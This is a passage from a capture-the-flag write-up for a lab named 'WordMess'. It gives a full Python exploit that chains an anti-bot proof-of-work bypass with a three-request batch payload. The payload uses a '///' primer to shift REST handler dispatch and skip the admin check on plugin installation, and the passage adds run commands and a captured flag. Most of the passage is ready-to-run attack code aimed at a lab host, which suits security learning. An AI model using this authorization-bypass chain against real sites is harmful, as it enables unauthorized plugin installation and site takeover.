python3 scripts/wordmess/wp2shell_trace.py https://lab-XXXX.labs-app.bugforge.io
```

### 3. wp2shell_exploit.py - The Weapon

This is the final exploit. It chains both layers: solve Forgeflare, then send the 3-request batch confusion payload that bypasses the admin check on POST `/wp/v2/plugins` and returns the flag.

The payload is the heart of it. Three sub-requests in one batch:

- `[0]` primer: `POST ///` - the malformed path. It errors out, but the error goes to the validation array, not the handler-matching array. This is what causes the +1 shift.
- `[1]` plugins: `POST /wp/v2/plugins` with `{"slug":"test","hook":"init"}` - this is the request whose CODE we want to run. Because of the shift, it runs under `[2]`'s handler, which has no permission check.
- `[2]` filler: `GET /wp/v2/posts` - a public endpoint. It absorbs the shift. Its handler (no auth) is the one that actually executes `[1]`'s plugins code.

The flag comes back in response `[1]`, inside the `body` object. The script scans all responses for a `flag` field and prints it.

```python
#!/usr/bin/env python3
"""
WordMess wp2shell exploit - CVE-2026-63030 batch route confusion.

Exploits the +1 handler shift in POST /wp-json/batch/v1 to bypass the
admin permission_callback on POST /wp/v2/plugins, installing a plugin
and capturing the flag. Pre-auth: only the forgeflare clearance is needed.

Mechanism (one-liner):
    A malformed path "///" in request[0] creates a WP_Error that is pushed
    to $validation[] but NOT to $matches[], so every subsequent request is
    dispatched under the NEXT request's handler. Request[1] (POST plugins)
    runs under request[2]'s handler, which has no permission_callback ->
    auth bypassed -> plugin installed -> flag returned.

Usage:
    python3 wp2shell_exploit.py <target_url>
    python3 wp2shell_exploit.py https://lab-XXXX.labs-app.bugforge.io

    # As a library
    from wp2shell_exploit import exploit
    flag = exploit("https://lab-XXXX.labs-app.bugforge.io")
"""
import urllib.request, urllib.error, json, ssl, sys, os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from forgeflare_bypass import get_clearance, UA

ctx = ssl.create_default_context()


def _ff_request(target, clearance, path, method="GET", body=None):
    """Single request with a pre-solved clearance cookie. No auto-refresh."""
    url = target + path
    h = {
        "User-Agent": UA,
        "Accept": "application/json, text/html",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": f"forgeflare_clearance={clearance}",
    }
    data = None
    if body is not None:
        data = body if isinstance(body, bytes) else json.dumps(body).encode()
        h["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        r = urllib.request.urlopen(req, timeout=20, context=ctx)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def exploit(target, slug="test", hook="init", verbose=True):
    """
    Run the wp2shell batch confusion exploit against a WordMess target.

    Args:
        target: base URL (no trailing slash)
        slug: plugin slug to "install"
        hook: hook name to register (cosmetic; the flag is returned regardless)
        verbose: print progress

    Returns:
        (flag_string, full_response_json) or (None, None) on failure.
    """
    target = target.rstrip("/")

    # Layer 1: forgeflare clearance
    if verbose:
        print(f"[*] Solving forgeflare PoW for {target} ...", file=sys.stderr)
    clearance = get_clearance(target, verbose=verbose)
    if not clearance:
        print("[!] Failed to obtain forgeflare clearance", file=sys.stderr)
        return None, None

    # Layer 2: batch route confusion
    # [0] primer  -> malformed path, errors but shifts the handler queue +1
    # [1] plugins -> POST /wp/v2/plugins with slug; runs under [2]'s handler
    #                (which has no permission_callback) -> auth bypassed
    # [2] filler  -> GET /wp/v2/posts; absorbs the shift, gets [0]'s error handler
    payload = {
        "requests": [
            {"method": "POST", "path": "///"},
            {"method": "POST", "path": "/wp/v2/plugins", "body": {"slug": slug, "hook": hook}},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]
    }

    if verbose:
        print(f"[*] Sending batch confusion payload ...", file=sys.stderr)
    status, body = _ff_request(target, clearance, "/wp-json/batch/v1", method="POST", body=payload)

    if verbose:
        print(f"[*] HTTP {status}", file=sys.stderr)
        print(f"[*] Body: {body[:500]}", file=sys.stderr)

    if status != 200:
        print(f"[!] Batch endpoint returned {status}, expected 200", file=sys.stderr)
        return None, None

    j = json.loads(body)
    responses = j.get("responses", [])

    # The flag is in response [1] (the plugins request that got the shifted handler)
    for r in responses:
        body_obj = r.get("body", {})
        if isinstance(body_obj, dict) and "flag" in body_obj:
            flag = body_obj["flag"]
            if verbose:
                print(f"[+] FLAG: {flag}", file=sys.stderr)
            return flag, j

    print(f"[!] No flag in responses: {json.dumps(responses)[:300]}", file=sys.stderr)
    return None, j


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("TARGET")
    if not target:
        print(f"Usage: {sys.argv[0]} <target_url>", file=sys.stderr)
        print(f"   or:  TARGET=<url> {sys.argv[0]}", file=sys.stderr)
        sys.exit(2)

    slug = os.environ.get("PLUGIN_SLUG", "test")
    hook = os.environ.get("PLUGIN_HOOK", "init")

    flag, _ = exploit(target, slug=slug, hook=hook)
    if flag:
        print(flag)
        sys.exit(0)
    sys.exit(1)


if __name__ == "__main__":
    main()
```

One command, end to end:

```bash
python3 scripts/wordmess/wp2shell_exploit.py https://lab-XXXX.labs-app.bugforge.io
# -> bug{epkp5TeLkxclJm3rK5uSp5zXAcbYNtGb}
```

As a library:

```python
from wp2shell_exploit import exploit
flag, response = exploit("https://lab-XXXX.labs-app.bugforge.io")
```

### Reading order

If you want to understand the chain, read the scripts in this order:

1. `forgeflare_bypass.py` - how to get past the anti-bot. The PoW and the telemetry fake.
2. `wp2shell_trace.py` - how to find the direction of the desync before committing to a payload. The six tests.
3. `wp2shell_exploit.py` - the weaponized version. Three requests, one flag.

If you just want the flag, run `wp2shell_exploit.py`. It does everything for you. But if you want to understand why the payload is ordered the way it is, run `wp2shell_trace.py` first and read its output alongside the "Finding the Shift Direction" section above.
